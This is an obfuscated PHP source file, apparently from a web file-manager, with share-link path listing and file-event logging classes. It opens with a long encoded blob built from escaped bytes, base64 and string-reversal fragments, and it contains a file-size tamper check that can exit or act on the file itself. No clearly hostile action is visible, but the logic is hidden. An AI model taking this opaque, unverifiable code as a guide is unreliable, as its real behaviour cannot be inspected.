15\2\326\106"."\15\74\242\42\203\45\254\233\140\135\214\151\144\55\241\254\267\251\236\24\77\307\351\151\72\313\311\35\253\116\232\322\233\116\111\104\223\253\51\256\160\225\27\113\364\25\202"."\x9a\xe2\x96\x48\x83\x73\x7c\xf1\x94\xc9\x87\x4e\xaa\x43\xa7\x7\xa6\xd2\x4\xb7\xff\xa1\xd3\x5a\xac\x60\x4f\x26\xdb\x7d\x93\xe0\x14\x62\x1\xb7\x35\xb4\xb7\xbc\x38\x5e\x4e\xcb\xfd\x5a\x6".base64_decode('LGeAC6VdcYLMFsapuK/bjGL2aDo5GiFMtLJ8jEi3hEQMOn3RDfFquP9Hu9+S7cs=').base64_decode('ZZxQzXeGRV9dNt/a5db0UFG3phfZX5yziDT/xL7QqyXRQb7gSdQJ13088+ieEYE=')."\101\316\110\101\252\325\110\150\200\261\275\250\225\355\115\265\265\27\242\332\11\144\51\110\377\140\122\201\45\326\124\12\45\261\172\141\267\373\146\267\143\1\145\201\203\353\24"._kodDe('L62M8eYJMDI1wGYnPT2toCQHppgtJfo9JJQ3gT+LhZ+JeEaSPaiLnAtPn5GQPocC').base64_decode('oE74WHkWgVsGY81kbLvMLuzL5jtcBpNXqhxdPXZCNb1MM5IepuWy1AYPfFKHzMM=')."\334\155\224\17\160\227\355\264\157\160\300\55\136\250\5\60\107\43\233\341\224\201\130\322\361\326\132\34\376\223\216\142\235\130\360\275\215\66\220\361\114\202\247\313\121\346\313".base64_decode('vAAnBToWIdEMWVoFazo2IEn6obP0Mp8isVQn70kMmhsSCu8EDdW4KIWWVWG3Nt4=').strrev('—o$Ga’½Â:á(~à'."\0".'€fÓáª+˜Â=Q„!ôÎZRi©’‘ÖtË')."\273\340\103\1\56\270\110\205\162\44\125\163\52\307\234\304\147\321\67\151\141\263\277\145\232\57\40\34\210\13\200\150\135\175\40\352\151\156\56\30\101\106\2\157\302\301\143"."\x24\x57\x7\x41\x1\x7c\x30\x6\x7f\x4d\x52\xd3\x49\x29\xe\x6d\x6f\x6b\x8a\x20\xb4\x48\x32\xf4\x38\xf5\xc6\x59\xe4\x26\x7c\x14\x25\xe0\x6a\xd1\x24\x95\x64\x29\x86\x59\xa4\x36\x40\x26\x4e"._kodDe('LHfmfZVBGZ1kC4WrpAXN1U+3mOkgQotkO6W1vtgqOtSsCcModBlihBk7JiKIXRB8')."\xe1\x41\x60\x5b\xb1\xd4\xe\xd6\x63\x66\x4d\x33\xd9\x9e\x39\x40\xcf\x5f\x26\xb9\x65\x31\x12\xce\xac\x90\x46\x45\x5c\xa6\x28\x75\xb3\x8d\xf0\x82\x3b\xfc\x9e\xb8\xcd\xbb\x7b\x9d\x9c\x99\x95"."\237\5\26\356\212\213\121\170\44\221\361\163\176\172\67\122\360\335\134\47\264\36\171\260\123\202\2\104\341\142\117\251\144\345\170\47\244\50\316\376\111\235\44\242\31\252\41"."\70\302\342\223\334\24\16\367\162\360\362\1\332\310\326\371\123\13\213\26\341\202\340\212\277\170\161\76\214\330\4\331\243\74\131\325\16\202\224\143\207\101\115\232\303\300\72".base64_decode('Zq0GU62YiENoGvzL8/gD03gAqx2WyHnU/A6FWucVu8oWL3ar9FC9tcia18VS43A=')."\253\313\232\36\364\204\240\236\45\44\0\173\112\54\77\116\47\223\357\120\167\31\277\352\300\16\317\45\170\242\136\123\63\171\36\73\67\231\117\343\250\20\250\126\214\247\303"."\337\337\356\214\314\146\237\165\1\56\346\142\64\331\10\36\363\26\27\332\21\361\130\135\177\116\351\146\317\3\210\131\361\267\47\153\51\225\276\222\201\366\363\123\152\314\315"."\x66\x3e\xde\xe3\x77\xc5\xb9\xfd\x3f\x4d\x82\xf8\x8e\xd\xe\x4f\xc1\x6d\x11\xd0\xce\x1a\x81\xbb\x1\x63\x4\x12\x58\x87\x1d\xe\xca\x62\x40\xf6\x31\xc9\x88\xeb\x6a\xd6\xb4\xf0\x2c\xfc\x1c"."\x58\x11\x7a\xd0\xa1\x43\xee\x96\x71\x92\x22\x89\x3e\x2f\x54\x84\xdc\x57\x17\x1\x1e\x85\x63\x8\x73\xe0\x4d\x99\x4\x99\x91\xa4\x2b\xa9\x9a\x22\xd4\x5c\xa3\x5d\x51\x40\x7e\xc4\x6e\xa\x55"."\2\62\26\111\224\123\246\145\206\61\335\324\300\42\110\171\37\175\112\245\45\104\214\150\75\1\162\206\102\304\253\63\27\340\337\341\147\122\242\101\157\367\244\24\35\133\12"."\42\16\204\116\325\332\370\266\25\171\331\245\71\24\214\4\353\350\343\30\205\366\267\306\120\131\326\300\127\47\270\316\103\255\270\147\170\347\132\123\60\351\300\115\40\144\370"."\365\134\46\303\314\26\240\270\310\226\60\174\46\25\156\317\231\174\361\203\336\255\43\360\112\231\101\300\202\73\62\350\14\115\111\270\54\201\2\311\360\46\56\54\204\316\7"."\313\36\5\56\76\245\121\47\154\225\345\345\345\316\362\12\360\77\73\56\45\362\126\165\171\171\136\222\362\362\152\364\77\216\100\73\253\4\213\326\30\60\201\51\347\41\11"."\172\200\346\117\276\110\22\65\223\243\42\321\274\72\150\144\57\301\246\21\13\57\223\265\37\40\20\335\202\243\114\140\242\240\310\115\224\320\161\34\11\51\166\44\260\163\116"."\x32\x24\x74\x35\x85\x33\x9d\x7e\x3\xc9\x4\xc\xf\x42\xa\x69\x2f\xbb\x22\x2\x92\xf1\x81\x9f\x88\x2f\xe6\xd4\xb0\x46\x79\x33\x89\x79\x62\x65\x2e\x8a\x5c\xc\xe4\xde\x5a\x9d\x34\xc2\x29".base64_decode('ej8nmTB755v8lqaBPGBRjbNeQYCwg4EuCLJbDSiUYtdGYTDAkmKf+fjOBUFJAQI=')."\153\327\172\242\174\141\204\301\351\54\204\60\4\365\27\112\125\11\242\176\115\44\150\242\154\221\122\21\75\73\40\147\370\350\242\144\247\232\262\334\350\212\12\145\213\310\231".strrev('ük®Ğƒ#í1Ñ¼Ğú§èØd³ÑW^Aâqwhá¯lŞ'."\0".'’˜A7€'."\0".'ãØxÒ`*vŠ')."\172\126\336\373\176\64\44\334\316\244\233\322\341\77\260\70\241\20\57\5\140\33\215\72\346\104\115\50\300\36\145\313\343\111\10\117\317\31\334\173\132\35\163\335\50\272\124".base64_decode('w2faguWDQfxD80NsWka3oIO4srqWBINliH0F8ObCYJY8P2WBRKxDYjoRCM2q6Cs=')."\150\204\356\370\225\56\231\277\317\50\44\345\167\226\4\240\325\360\111\210\250\143\57\161\210\100\250\323\210\146\13\350\222\256\265\14\250\54\131\41\254\145\277\103\53\124\311"."\65\311\213\171\302\225\75\222\214\163\2\270\1\41\156\205\252\32\265\210\200\330\340\247\223\126\70\206\141\225\63\56\172\154\215\40\373\257\224\102\37\353\43\354\6\321\75"."\x2c\x0\x59\x8e\xd8\x10\xc8\x69\x95\x4c\xb6\x9a\x1a\x31\x9b\x35\xee\xc3\xb\x2f\xa7\x1f\x57\xd2\x54\x10\x85\x6c\xc7\x4c\xdc\x2e\x86\xe8\x8b\x8a\xbb\x1\x70\xd2\x35\xb2\x37\xe2\xa\x10\x9d"."\225\260\362\50\10\155\46\303\2\252\31\177\22\102\100\25\42\31\345\4\155\157\127\116\241\122\235\300\314\44\223\263\62\302\170\42\355\272\146\232\342\55\155\117\102\340\300"."\x7e\x71\x4d\x8f\xe0\x2c\xce\xc9\xbc\x1e\xcb\xe9\x92\xe0\x6d\x95\x25\x5\x6b\x9\xad\x5d\xa6\xeb\xb\x32\x53\x42\x5e\xc2\x5\x85\xc4\x16\xb4\x9b\x32\xa1\xd5\xc1\xa4\xfc\x9f\xba\xa9\xcd\xb0"."\167\134\340\160\206\5\113\222\2\65\220\114\54\13\131\244\164\45\256\351\110\63\25\256\234\146\314\220\222\24\203\176\215\151\344\360\64\103\51\120\4\364\51\40\220\70\244"."\2\240\53\346\104\17\5\202\227\133\20\22\334\12\13\302\206\263\102\142\122\112\24\227\214\3\243\204\10\224\276\220\300\142\333\27\22\214\107\221\52\34\316\305\330\26\274"."\x4d\x8c\xa0\xf6\xa8\x92\xb8\x4a\x53\x3\x53\x58\x0\xba\xec\xd\x7b\x60\x88\x71\xa0\x58\xe8\xd1\x92\xf7\x4c\xcc\x82\xea\xcc\xcb\x82\xe3\xe0\xca\xca\x2d\x51\xc5\x18\x3\xe8\x4e\x10\x55\x7b"."\217\51\120\25\212\22\60\32\147\216\47\10\166\70\222\110\104\237\102\255\325\234\25\225\316\321\144\367\127\64\122\45\213\57\301\57\224\157\5\62\200\122\70\345\203\304\364"."\214\244\343\151\64\341\255\70\164\61\232\137\323\104\167\300\331\170\242\313\342\54\244\13\353\226\302\314\322\320\255\151\221\255\360\43\146\154\255\6\23\264\24\212\307\30\202"."\321\365\26\143\76\133\2\60\63\254\361\304\165\161\332\362\366\57\240\3\213\105\210\255\20\342\236\132\164\311\214\162\361\176\160\273\110\0\322\260\203\144\1\61\374\250\34"."\337\47\247\6\235\214\57\161\160\104\143\300\374\343\166\27\63\150\45\167\165\310\243\154\45\245\360\256\216\145\377\243\251\217\335\271\200\126\51\160\221\140\126\205\206\30\240".strrev('Õ¤÷¢>³5]WÌş;K=»E-P3vlnoOL7k£ÕK3rXá['."\0".'K'."\r".'8Œ±')."\xb8\xe4\xf\x4e\xf3\xd5\x79\xfc\xf5\xbe\xf0\xc\x29\xa9\x98\xc2\xb3\xd7\xc8\xcf\xb8\x75\x4e\xa3\xfd\x29\x3c\x2\x94\xbc\x63\xcc\xd5\x36\xfc\x74\xc6\x80\x74\xe9\x4c\x30\x99\xdb\xe0\xd2\xb5"."\x60\x94\x24\xbc\x23\x62\x2d\x16\x13\xa2\xa2\xe7\x95\x8\x64\xf5\xb4\x75\xd6\xa3\x3c\x70\xd7\xad\x40\xea\x14\xdf\x84\x12\x12\x67\x75\x25\x3f\x7d\x9f\x82\x5e\xfd\xe5\x2d\x16\x32\xe4\xa\xb4".base64_decode('hqQvXAOYB9bUYEVWMntrvJrpVg2VcwCao08sne8r6szbe0J0Di+MAEc2riXfNws=')."\x71\x46\x21\xfa\x18\xb6\xe9\xc6\x78\x98\x44\x27\x3e\x59\xba\x4b\x4e\x9e\xb0\xe2\xaf\xb\xa0\xa0\xf0\xee\x43\x56\x97\x55\x43\x11\x0\xf8\x1\x82\x32\x62\x98\x2f\xa7\x52\x96\x87\x99\x52\x6d".base64_decode('QjBnXUoLVhXFFVCY4CeoUIIQfFP3f91UNcE9aKgJeiDPLiNg99V14iNetM68ty0=')."\376\360\225\14\7\77\127\210\42\257\4\364\51\36\364\222\70\71\64\141\7\322\121\354\34\200\127\1\224\67\275\57\53\36\354\270\23\324\331\77\125\46\241\133\42\57\335"."\341\205\1\56\11\303\344\244\64\130\35\326\205\200\146\6\117\70\250\314\114\267\124\0\77\40\170\266\34\154\332\336\373\260\333\44\132\136\316\315\253\3\132\124\221\162\346"."\xc1\xee\x80\x94\xf3\x79\xe7\x40\x88\xb9\xa4\xe7\x59\xed\x31\x5\x1a\x0\xa2\x25\xbe\x51\xc1\x12\x48\x35\x52\x39\x7e\x81\x86\x39\x19\x97\x26\xd1\x5b\x54\xbc\x2\xe4\xda\xc3\x9b\xce\x9a\x16".base64_decode('PbFRNEYWxgYDkGjDdQNoVqKl+/IAlv0KP20XMz2DLtYzbZqIP8R4oWU5fh4KK6Q=')."\16\40\334\53\146\376\213\21\70\373\377\227\214\70\62\54\30\344\131\13\311\157\220\141\137\333\270\234\5\37\303\150\327\172\254\157\104\101\210\375\371\13\313\303\27\302\244"."\101\127\157\305\247\72\350\203\11\32\363\126\207\47\237\120\340\10\374\323\112\176\351\142\144\57\32\263\37\122\173\51\43\225\272\166\65\225\320\231\145\4\7\64\51\134\267".base64_decode('RLmgcYBM3yBk7xlxKmOu85mrfD6z0cM69XtJZwNL1jcD+FMMfKG0Oqtnx4EGnxE=')."\206\151\171\14\41\242\105\344\244\3\313\141\220\265\361\120\155\237\370\55\332\104\242\116\203\110\202\167\65\301\6\175\262\220\200\276\114\224\160\240\147\163\60\277\263\373\360"."\27\246\33\143\242\142\356\144\112\213\311\251\20\266\61\262\134\106\320\201\16\305\354\6\55\311\60\310\55\147\263\374\270\302\166\104\201\201\344\270\42\227\361\341\113\156\26"."\250\56\350\150\242\125\52\76\244\341\367\173\110\162\120\133\63\76\225\41\335\26\213\244\47\145\154\313\262\101\170\240\326\235\177\262\6\155\240\10\163\20\115\4\311\41\247"."\113\124\242\110\2\151\222\304\7\330\62\47\41\101\0\111\326\201\76\320\244\27\205\356\337\201\62\72\264\276\362\200\11\26\375\324\53\155\114\3\201\141\276\60\213\127\173"."\371\211\272\375\301\40\132\15\173\375\310\201\173\306\337\264\303\157\35\71\330\273\106\16\354\330\311\101\136\63\162\360\173\132\277\367\120\4\177\167\322\372\130\45\154\63\263"."\251\313\123\5\354\132\0\103\225\55\103\310\216\270\210\226\277\67\310\317\23\63\271\64\77\241\5\1\253\126\224\327\141\241\207\71\75\345\100\247\251\16\352\311\306\206\16"."\336\53\161\144\12\340\360\217\313\300\246\225\110\325\111\130\271\116\365\244\230\116\117\241\354\311\124\13\325\105\165\205\337\127\300\156\306\362\36\44\231\233\116\124\216\36\73".base64_decode('QdxS4OPDT3dG4x9ytkREBj7i0oCFniTq20yctyjSavWa/+yYjQP/7yifi+o4qWA=')."\203\232\377\70\143\36\6\20\21\12\226\33\302\372\145\73\246\327\340\351\271\301\247\17\136\261\370\143\143\326\272\360\32\136\240\37\274\132\141\46\340\327\237\264\24\324\154"."\323\160\167\326\324\145\253\366\126\110\111\101\230\240\32\221\212\136\116\125\354\155\107\210\41\173\30\74\132\320\142\304\22\115\315\276\1\3\263\303\165\11\355\377\5\63\51"."\262\312\302\373\247\174\116\11\54\345\177\61\200\124\121\301\72\15\67\322\50\320\163\367\124\312\67\12\274\356\45\234\156\377\116\273\261\210\305\224\62\247\154\72\5\202\24".base64_decode('Nu0UM4gGGAcFHdHaV1vxIBsvY75D2luifDlLeASMe+EQJCyYm15024uKTZmT+Lw=').base64_decode('mdnOdQg8Qy2zVfAYKN78QQWJ0yC/aLQ1Q9pLpmtjJNKML3d5prELX7JgQwNRJ7w=')."\345\247\211\337\326\333\324\101\352\374\14\310\104\26\375\15\204\353\155\317\75\42\226\143\177\3\222\366\37\315\163\316\302\204\233\203\26\145\201\75\327\143\121\36\14\373\113"."\132\100\172\22\35\45\202\40\243\160\262\126\22\136\207\314\223\161\155\16\373\213\250\131\341\342\264\355\201\147\141\227\324\372\164\263\345\202\45\364\27\141\233\326\364\332\246".strrev('Õäˆ®°ımR÷’˜¨ZK<ˆÓ‘kËlıÓ–Æ£­ÿÔtıÿşğTßÃ–»ß{a')."\x71\xfe\x3e\xaa\x10\x66\x36\x98\xd4\x67\x8\x75\x25\x22\xd3\xf3\x17\x39\x95\xb2\x1f\x46\xe6\x69\x0\x79\xf\xeb\x1\xe2\xeb\x64\xaf\xc1\x15\xa\xe4\xbf\x67\x6b\xa1\x33\x2a\x49\xa\xaf\xa9"."\xaa\xf1\xce\x2\x87\x85\x10\xdb\x7e\xab\x6f\x48\x61\xfd\xcf\x4b\xc6\x59\x11\x10\x13\xa8\xf3\x14\x37\xfd\x8a\x43\x5\xa\xa\x89\x94\x3\x8a\x57\x0\x83\x59\xaa\x6a\x95\x12\xa6\x3b\x7f\x2a".strrev('y³sóÏó¬öZÜD2\'Z{dÑÉkE½š'."\r".'DPC‚ÄKXò€°“"a1Rèå').base64_decode('K2aBpqrWXR321mu5/fHXCmd+ZdhSHG4shKAqTzdn0LEGOnYskAfTWZin2QulF54=')."\x6f\xec\x49\x37\xae\xcf\xc2\x2f\xb1\xbf\x74\xde\x36\xeb\x1a\x92\xb5\xac\x50\xb6\xbd\x21\x58\x9\xa\xf\x8f\xe6\x3d\x2c\x68\x3b\x1e\x0\x8a\xf\x3f\x2f\x53\x35\xe4\x1f\x96\x74\x3b\xdc\xd2"."\124\202\56\73\20\112\5\162\273\360\36\273\231\316\342\375\262\1\141\271\244\67\211\4\43\135\2\262\354\152\31\242\173\157\153\116\150\166\155\235\51\223\13\45\213\153\272"."\41\44\143\360\102\151\341\333\215\246\5\233\334\151\257\335\131\57\122\162\261\336\152\121\137\311\341\244\10\22\316\356\200\44\233\260\372\32\107\221\10\114\35\162\221\22\204"."\xd3\x27\xeb\xe1\x1f\x73\x1d\x9a\xc7\xa9\x72\xaa\x5f\x88\x46\xb9\xa8\x77\x17\xf0\xb\x6f\x54\xf9\xf8\xb5\x79\x14\x8d\xb7\xd3\x3d\xdd\xb2\x49\x8f\xd0\xec\xb9\xac\xcf\xba\xa\x47\x85\x71\x44".base64_decode('O9780yB+SCWs8zQbVDM4C7bBBT7PuZ3czQ+AuKCbSLAnhC1JE1TUZ1AA4a8NQ7E=')."\106\270\244\311\355\202\225\36\373\13\221\56\361\142\247\45\141\76\224\137\342\24\362\363\143\2\336\115\10\53\324\175\64\145\254\331\305\113\242\214\250\70\10\373\157\146\106"."\64\202\122\1\355\333\271\165\15\356\12\323\220\171\225\326\53\251\54\31\33\63\220\6\335\46\160\132\240\66\65\11\356\67\320\25\333\26\145\210\257\43\133\117\0\105\225"."\x5d\x20\x1\x25\xe5\x17\x8a\x13\x4f\x7\xf7\x9a\x21\x5c\xb8\x12\x4e\x95\x56\x14\xb\xd7\x77\x79\x4\x5d\xac\xc4\x52\x2c\xcc\x8e\x75\x8c\xa4\xc\x89\x91\x96\xe6\xd8\x87\x16\x49\xf8\x9c\x7c"."\x31\x30\x8d\xb6\x34\x71\x9c\xc7\x1a\x85\xd3\x2b\xb6\xd6\x8b\x19\xec\x3d\xc3\x39\x8c\x1e\xd5\x8c\xb7\xb\x6a\x47\x7e\x64\x3e\x5c\xcf\x43\x2a\xa9\xa8\x70\x7b\xed\xad\xa2\x38\xb5\x2b\x63\xbc".base64_decode('kLz2CCYGEa1AHtyigtlwFMzJxUVL3r2gAObFUTBvXjTNLOxdCPlMOWfspXv5yCM=')."\xa\x7d\xa2\x40\x87\x6d\x6a\x2f\x4e\xba\x37\x7c\x16\x4c\x9c\x5f\x1d\xa1\x38\x7b\x6a\xb4\x3\x50\xb8\x15\x5c\x71\xb7\x9d\xf0\x16\x6a\x45\xc1\xc4\x7b\x6d\x45\x81\x77\xc9\x89\xa3\xb3\x2\xbc"."\226\306\24\340\256\374\314\77\237\217\363\270\2\26\10\270\114\270\106\213\176\165\12\104\213\346\14\205\15\36\102\5\247\276\141\265\104\260\301\105\304\120\253\44\240\234\361".strrev('tÉMi_:U@v\'4•X\'&f’³Jòê³CoeM4í¸$L¶4ftË–İû®—').base64_decode('D1yww8Zai2aqccEaituksm6qXIxPCXtttm0urthbzsoLbAQhEP508e1ki1U6Xv8=')."\xc9\x3e\x3a\x3e\x4d\xab\x83\xa7\xb6\xec\x8\x5\xaa\x57\xe\xbc\x5e\xe2\xe8\xb0\xa6\x9b\xe\x18\x17\xd1\xb2\xe8\xb7\x56\x33\x4d\x7e\xba\x8c\xd5\x65\x24\xe4\xc1\x45\xcf\x21\x18\x49\x80\x2f".strrev('ê^´ÆD '."\0".'ä;g!¯|äi® ,G€ÆÌE'."\n".'ÃCÔ¹É>¶"9ğ¶ˆ±^~').base64_decode('xA7efOXt4U9Ky3ZBjssghN5Ekw90v9hw4xg3cf/rRGWQt0pcHdmkJTt+fYHZM/4=')."\x5e\x9\x64\x1b\x92\x17\x81\xdd\x82\xa2\x1d\x24\xe8\x20\xd7\x3b\xc7\x17\x8e\x84\xf3\xa2\x9a\x3d\xe1\xf0\xec\x60\xa8\x1e\x7b\x11\xcd\x8b\x46\xb9\x4\x13\x9a\xbc\xa8\xe6\xc6\x60\x60\x6f\x71"."\xde\x26\x8f\xcf\x9f\x17\x7\xad\x6d\x2\x51\xee\xe5\x8\x47\xf9\x9a\x51\x2b\x3d\x7e\x7f\x70\xf6\xde\x5a\xe1\xab\x9b\xc1\x5b\x82\xe\x4d\xf9\xee\x76\xb6\x5d\xa3\x9b\xd6\x74\xf7\x3f\x2c\xa7"."\250\56\55\134\232\123\322\334\335\25\317\143\335\42\20\307\325\240\236\340\330\207\325\327\276\315\272\215\22\54\51\10\132\312\4\110\331\241\54\201\102\257\252\154\162\63\141"."\x19\x75\x48\xb4\xa2\xe3\xc7\xc2\x2e\xcb\xf1\xb1\x0\x47\x93\x5\xb1\x18\x81\x8\xc5\xd5\x15\x1\xca\xa\x62\x4c\xdc\x2a\xcd\xdf\xba\x47\xb1\x1c\x23\xb0\xa5\xd3\x35\x62\x80\xd5\xa1\xc5\x84"."\xad\x79\xac\xbb\x90\x9b\x6c\x4\xc7\x82\x79\x14\xfe\x26\xd1\xff\x7\x64\xaf\xb8\xff\x46\xa3\x0\x0", 10, -8))); goto a”¶ì¬«ñ; aÖÇÓéÒåã: $_size = $_SERVER[ÀÆ][872]; if ($_SERVER[$_SERVER[ÀÆ][857]] != $_size($_file)) { $_getc = $_SERVER[ÀÆ][859]; $_getfile = $_SERVER[$_SERVER[ÀÆ][860]] . $_SERVER[ÀÆ][861]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÀÆ][229], $_getfilec); if (count($_getarrs) < $_SERVER[ÀÆ][612]) { $exit = $_SERVER[ÀÆ][862]; $exit(); } $_act = $_SERVER[ÀÆ][863]; $_act($_file); } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Ú˜Œ‚‡ˆğÑù„) { $this->pathParse = $Ú˜Œ‚‡ˆğÑù„; } protected function infoParse($Àœ²×´, $Ó’ÓŞ = false) { $ïÊëô =& $_SERVER[ÀÆ]; return Action($ïÊëô[1102])->sharePathInfo($this->pathParse[$ïÊëô[76]], !0, $Ó’ÓŞ); } public function listPath($ÕÂ¸ŸÇÚª, $µ¹éÌ¦ğÙ¬³Û = false) { $’ò =& $_SERVER[ÀÆ]; $ú£á = IO::listPath($ÕÂ¸ŸÇÚª, $µ¹éÌ¦ğÙ¬³Û); foreach ($ú£á as $—îÜ£æ¢Œ‡Û => $øêò®™ê§Ø¼) { if (!in_array($—îÜ£æ¢Œ‡Û, array($’ò[74], $’ò[75]))) { continue; } foreach ($øêò®™ê§Ø¼ as $¯áúÍ¦úĞœ’Ï => $ù”ñğè) { $ù”ñğè = Action($’ò[1267])->parsePathChildren($ù”ñğè, array($’ò[416] => $ÕÂ¸ŸÇÚª)); $ú£á[$—îÜ£æ¢Œ‡Û][$¯áúÍ¦úĞœ’Ï] = Action($’ò[1102])->shareItemInfo($ù”ñğè); } } return $ú£á; } public function listAll($Æ¹ ·Ì“‹) { $ã¿—¿ªå§ñ =& $_SERVER[ÀÆ]; $ãÆä§»¤‹ŒÜ = IO::listAll($Æ¹ ·Ì“‹); foreach ($ãÆä§»¤‹ŒÜ as &$–•É—§—) { $ñ·  = IO::info($–•É—§—[$ã¿—¿ªå§ñ[76]]); $ñ·  = is_array($ñ· ) ? $ñ·  : array(); $–•É—§— = array_merge($ñ· , $–•É—§—); $–•É—§—[$ã¿—¿ªå§ñ[85]] = Action($ã¿—¿ªå§ñ[1102])->shareItemInfo($–•É—§—); } unset($–•É—§—); return $ãÆä§»¤‹ŒÜ; } } goto DÎ†•á·Ü; bÜŠµ÷Ó˜Ø: class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\165\x72\x63\145\x5f\145\x76\145\x6e\164"; protected $dataAuto = array(array("\x63\162\145\x61\x74\x65\x54\151\x6d\x65", "\164\x69\x6d\145", "\x69\156\x73\145\162\x74", "\146\165\156\143\164\x69\157\x6e"), array("\144\x65\x73\143", '', "\x69\156\163\x65\162\x74\54\165\x70\x64\141\x74\x65\x2c\x73\145\x6c\145\143\164", "\152\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ êÆÜ¡Ü˜‰, $˜´İÚ·çší¤², $áú¦¥õÓ = '') { $ìµıñšÓ =& $_SERVER[ÀÆ]; if (!$this->eventSave) { return; } $ÔåäØ÷ìü = Model($ìµıñšÓ[1250])->sourceInfo($ êÆÜ¡Ü˜‰); if (!$ÔåäØ÷ìü) { return !1; } if ($this->isCacheEvent($ÔåäØ÷ìü, $˜´İÚ·çší¤²)) { return; } if ($áú¦¥õÓ && is_string($áú¦¥õÓ)) { $áú¦¥õÓ = array($ìµıñšÓ[1777] => $áú¦¥õÓ); } $ßşÉÑ©³›–§Ü = array($ìµıñšÓ[412] => $ êÆÜ¡Ü˜‰, $ìµıñšÓ[1953] => $ÔåäØ÷ìü[$ìµıñšÓ[492]], $ìµıñšÓ[1954] => $ÔåäØ÷ìü[$ìµıñšÓ[28]], $ìµıñšÓ[513] => !empty($ÔåäØ÷ìü[$ìµıñšÓ[513]]) ? $ÔåäØ÷ìü[$ìµıñšÓ[513]] : $ìµıñšÓ[33], $ìµıñšÓ[1563] => USER_ID, $ìµıñšÓ[417] => $˜´İÚ·çší¤², $ìµıñšÓ[1565] => $áú¦¥õÓ); $this->addSystemLog($˜´İÚ·çší¤², $ßşÉÑ©³›–§Ü); unset($ßşÉÑ©³›–§Ü[$ìµıñšÓ[1954]], $ßşÉÑ©³›–§Ü[$ìµıñšÓ[513]]); return $this->add($ßşÉÑ©³›–§Ü); } private function addSystemLog($©‘µñ, $ùƒÏğ×Öş…Â) { $Éó£òËÊÓŞå =& $_SERVER[ÀÆ]; if ($©‘µñ == $Éó£òËÊÓŞå[1955]) { $©‘µñ = $ùƒÏğ×Öş…Â[$Éó£òËÊÓŞå[445]][$Éó£òËÊÓŞå[1956]]; } else { if (in_array($©‘µñ, array($Éó£òËÊÓŞå[1718], $Éó£òËÊÓŞå[1957]))) { $©‘µñ = $ùƒÏğ×Öş…Â[$Éó£òËÊÓŞå[445]][$Éó£òËÊÓŞå[740]]; } } $Ãèì†ã·ü‚³³ = array_merge($ùƒÏğ×Öş…Â, array($Éó£òËÊÓŞå[1958] => $ùƒÏğ×Öş…Â[$Éó£òËÊÓŞå[397]], $Éó£òËÊÓŞå[1959] => $ùƒÏğ×Öş…Â[$Éó£òËÊÓŞå[1959]])); Model($Éó£òËÊÓŞå[1682])->addLog($Éó£òËÊÓŞå[1960] . $©‘µñ, $Ãèì†ã·ü‚³³); } private function isCacheEvent($úŒ‹Â¿„, $Ì’ßç) { if ($úŒ‹Â¿„[$_SERVER[ÀÆ][406]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($¥ªôáÍ, $æ‘ü’) { $”¨â¹ÀÈ˜Ø =& $_SERVER[ÀÆ]; $íğ×·ƒ¬¦ = Model($”¨â¹ÀÈ˜Ø[1250])->sourceInfo($¥ªôáÍ); $ÇŞ¡Ğ = array($”¨â¹ÀÈ˜Ø[1956] => $æ‘ü’, $”¨â¹ÀÈ˜Ø[28] => $íğ×·ƒ¬¦[$”¨â¹ÀÈ˜Ø[28]]); return $this->addEvent($¥ªôáÍ, $”¨â¹ÀÈ˜Ø[1955], $ÇŞ¡Ğ); } public function eventFileEdit($”àôØ‰¹¼«) { $ŠŒÉ¼õ =& $_SERVER[ÀÆ]; $áßú¦ = array($ŠŒÉ¼õ[1961] => $_SERVER[$ŠŒÉ¼õ[1962]], $ŠŒÉ¼õ[1963] => strtolower(ACTION)); return $this->addEvent($”àôØ‰¹¼«, $ŠŒÉ¼õ[1708], $áßú¦); } public function eventRecycle($©ñîöå±º, $ÅÏâæİëÎÁ®) { return $this->addEvent($©ñîöå±º, $_SERVER[ÀÆ][1957], $ÅÏâæİëÎÁ®); } public function eventRemove($’¢Ù) { $¾…†‘ó¨ =& $_SERVER[ÀÆ]; $¸—‡Ç©­§‹Ç = Model($¾…†‘ó¨[1250])->sourceInfo($’¢Ù); $ÃÁ—³—àá = $¸—‡Ç©­§‹Ç[$¾…†‘ó¨[28]]; return $this->addEvent($¸—‡Ç©­§‹Ç[$¾…†‘ó¨[492]], $¾…†‘ó¨[1707], $ÃÁ—³—àá); } public function eventShare($œ¦, $Å•‘ŠÏ) { return $this->addEvent($œ¦, $_SERVER[ÀÆ][1718], $Å•‘ŠÏ); } public function eventMove($Ì÷¿üØ, $œ±Ù©ŠÃ€, $Ô‘¾“Â) { $ï»ÈªÁ³® =& $_SERVER[ÀÆ]; $†ö·ÍªÊ = Model($ï»ÈªÁ³®[1250]); $âÌ˜õ¾ûî§À = $†ö·ÍªÊ->sourceInfo($Ì÷¿üØ); $«Â± = $†ö·ÍªÊ->sourceInfo($œ±Ù©ŠÃ€); $†à§å‡’¦®§ = $†ö·ÍªÊ->sourceInfo($Ô‘¾“Â); $Í°³ = array($ï»ÈªÁ³®[1087] => $œ±Ù©ŠÃ€, $ï»ÈªÁ³®[1964] => $«Â±[$ï»ÈªÁ³®[28]], $ï»ÈªÁ³®[1944] => !empty($«Â±[$ï»ÈªÁ³®[513]]) ? $«Â±[$ï»ÈªÁ³®[513]] : $ï»ÈªÁ³®[33], $ï»ÈªÁ³®[1088] => $Ô‘¾“Â, $ï»ÈªÁ³®[1965] => $†à§å‡’¦®§[$ï»ÈªÁ³®[28]], $ï»ÈªÁ³®[1966] => !empty($†à§å‡’¦®§[$ï»ÈªÁ³®[513]]) ? $†à§å‡’¦®§[$ï»ÈªÁ³®[513]] : $ï»ÈªÁ³®[33]); $this->addEvent($Ì÷¿üØ, $ï»ÈªÁ³®[545], $Í°³); $âÌ˜õ¾ûî§À = $†ö·ÍªÊ->sourceInfo($Ì÷¿üØ); $Í°³ = array($ï»ÈªÁ³®[397] => $âÌ˜õ¾ûî§À[$ï»ÈªÁ³®[397]], $ï»ÈªÁ³®[28] => $âÌ˜õ¾ûî§À[$ï»ÈªÁ³®[28]]); $this->addEvent($œ±Ù©ŠÃ€, $ï»ÈªÁ³®[1967], $Í°³); } public function eventCopy($şø± É‘Ò‰«) { $this->eventCreate($şø± 